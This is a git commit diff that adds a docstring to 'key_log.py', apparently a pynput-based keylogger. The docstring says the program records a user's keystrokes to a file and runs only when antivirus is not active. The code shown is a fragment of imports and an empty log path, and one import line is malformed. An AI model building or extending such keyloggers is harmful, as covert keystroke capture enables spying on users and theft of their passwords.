e6e01178628adfeb098ff8820b508d280a0e55fe
kumarprincepk <63443684+kumarprincepk@users.noreply.github.com>
2021-10-15 10:50:38 +0530

    Update key_log.py

--- key_log.py
+++ key_log.py
@@ -1,3 +1,5 @@
+''' This code is used for the making a text file and storing key hits by the user. This program runs only when the window antivirus and third-party antivirus is not working 
+on the system'''
 import pynput.keyboard import Key, Listener
 import logging
 log_dir=""
